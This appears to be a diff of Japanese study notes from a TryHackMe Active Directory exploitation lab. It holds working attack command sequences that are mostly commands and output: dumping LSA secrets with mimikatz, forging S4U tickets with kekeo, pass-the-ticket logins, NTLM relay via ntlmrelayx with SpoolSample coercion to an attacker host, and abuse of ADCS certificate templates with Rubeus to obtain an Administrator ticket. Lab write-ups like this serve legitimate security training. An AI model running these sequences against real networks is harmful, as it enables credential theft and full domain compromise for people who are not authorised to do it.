@@ -1,5 +1,7 @@
 # AD 侵入
 
+https://tryhackme.com/room/exploitingad
+
 ## NetNTLM
 
 ### パスワードスプレー攻撃の例
@@ -233,4 +235,146 @@ https://github.com/funoverip/mcafee-sitelist-pwd-decryption
 $ python ./mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
 Crypted password   : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
 Decrypted password : MyStrongPassword!
+```
+
+## 委任
+
+### 権限委任
+
+ACE とそのエクスプロイト方法一覧  
+https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#
+
+| 権限                    | 説明                                                                                                                                                                             |
+| ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **ForceChangePassword** | ユーザーの現在のパスワードを知らなくても、現在のパスワードを設定できる。                                                                                                         |
+| **AddMembers**          | ユーザー (自分のアカウントを含む)、グループ、またはコンピューターを対象グループに追加できる。                                                                                    |
+| **GenericAll**          | ユーザーのパスワードを変更したり、SPN を登録したり、ターゲット グループに AD オブジェクトを追加したりする機能を含め、オブジェクトを完全に制御できる。                            |
+| **GenericWrite**        | ターゲット オブジェクトの保護されていないパラメータを更新できる。これにより、たとえば、scriptPath パラメータを更新して、ユーザーが次にログオンしたときにスクリプトを実行できる。 |
+| **WriteOwner**          | 対象オブジェクトの所有者を更新できる。自分自身を所有者にすることで、オブジェクトに対する追加の権限を取得できる。                                                                 |
+| **WriteDACL**           | ターゲット オブジェクトの DACL に新しい ACE を書き込める。たとえば、アカウントにターゲット オブジェクトに対する完全な制御を許可する ACE を書き込める。                           |
+| **AllExtendedRights**   | 対象オブジェクトに対して拡張 AD 権限に関連付けられた任意のアクションを実行できる。これには、たとえば、ユーザーのパスワードを強制的に変更できる機能が含まれる。                   |
+
+### Kerberos 委任
+
+Kerberos 委任の実際の使用法は、アプリケーションが別のサーバーでホストされているリソースにアクセスできるようにすること
+
+### リソースベースの制限付き委任
+
+どのオブジェクトがどのサービスに委任できるかを指定する代わりに、サービスがどのオブジェクトが委任できるかを指定する。これにより、サービス所有者は誰がアクセスできるかを制御できる。
+
+例：svcIIS アカウントは THMSERVER1 上の HTTP および WSMAN サービスを委任できる。
+
+msDS-AllowedToActOnBehalfOfOtherIdentity 属性に注目。
+
+```ps
+PS C:\Tools> Get-NetUser -TrustedToAuth
+
+logoncount               : 37
+badpasswordtime          : 2/5/2025 12:37:07 AM
+distinguishedname        : CN=IIS Server,CN=Users,DC=za,DC=tryhackme,DC=loc
+objectclass              : {top, person, organizationalPerson, user}
+displayname              : IIS Server
+lastlogontimestamp       : 2/5/2025 12:07:54 AM
+userprincipalname        : svcIIS@za.tryhackme.loc
+name                     : IIS Server
+objectsid                : S-1-5-21-3885271727-2693558621-2658995185-6155
+samaccountname           : svcIIS
+codepage                 : 0
+samaccounttype           : USER_OBJECT
+accountexpires           : NEVER
+countrycode              : 0
+whenchanged              : 2/5/2025 12:07:54 AM
+instancetype             : 4
+usncreated               : 78494
+objectguid               : 11e42287-0a25-4d73-800d-b62e2d2a2a4b
+sn                       : Server
+lastlogoff               : 1/1/1601 12:00:00 AM
+msds-allowedtodelegateto : {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1, http/THMSERVER1.za.tryhackme.loc,
+                           http/THMSERVER1}
+objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
+dscorepropagationdata    : 1/1/1601 12:00:00 AM
+serviceprincipalname     : HTTP/svcServWeb.za.tryhackme.loc
+givenname                : IIS
+lastlogon                : 2/5/2025 1:44:29 AM
+badpwdcount              : 0
+cn                       : IIS Server
+useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
+whencreated              : 4/27/2022 11:26:21 AM
+primarygroupid           : 513
+pwdlastset               : 4/29/2022 11:50:25 AM
+usnchanged               : 172105
+```
+
+```ps
+# svcIIS のパスワードを表示
+mimikatz # token::elevate
+mimikatz # lsadump::secrets
+
+# TGTを生成
+kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:<password>
+
+# TGS 要求を偽造
+tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
+
+# インポート。（新しいmimikatzインスタンスで）
+mimikatz # privilege::debug
+mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
+
+# t1_trevor.jones として thmserver1 にログイン
+PS C:> New-PSSession -ComputerName thmserver1.za.tryhackme.loc
+PS C:> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
+```
+
+## 自動リレー
+
+### マシンアカウント
+
+AD には、あるマシンが別のマシンに対して管理者権限を持つという例外的なケースがある。
+
+Bloodhound のカスタムクエリ
+
+```text
+MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
+```
+
+### 認証リレー
+
+```shell
+# SMB署名が強制されていないことを確認
+nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
+
+# NTLMリレーを設定（リッスン）
+python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug
+
+# THMSERVER2 に認証を強制
+SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"
+
+# 例
+python3.9 ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -c 'whoami /all' -debug
+```
+
+## AD 証明書
+
+```shell
+# 証明書を列挙
+certutil -Template -v > templates.txt
+```
+
+有害な証明書テンプレート設定の組み合わせの例
+
+- クライアント認証- 証明書はクライアント認証に使用できる。
+- CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT - 証明書テンプレートを使用すると、サブジェクト別名 (SAN) を指定できる。
+- CTPRIVATEKEY_FLAG_EXPORTABLE_KEY - 証明書は秘密キーとともにエクスポート可能になる。
+- 証明書のアクセス許可- 証明書テンプレートを使用するために必要なアクセス許可がある。
+
+mmc（GUI）でテンプレートを使って証明書を作成し、秘密鍵とともに証明書をエクスポートした後
+
+```shell
+# TGT要求
+Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.tryhackme.loc /dc:<IP of domain controller>
+
+# TGTをロード
+mimikatz # privilege::debug
+mimikatz # kerberos::ptt administrator.kirbi
+mimikatz # exit
 ```
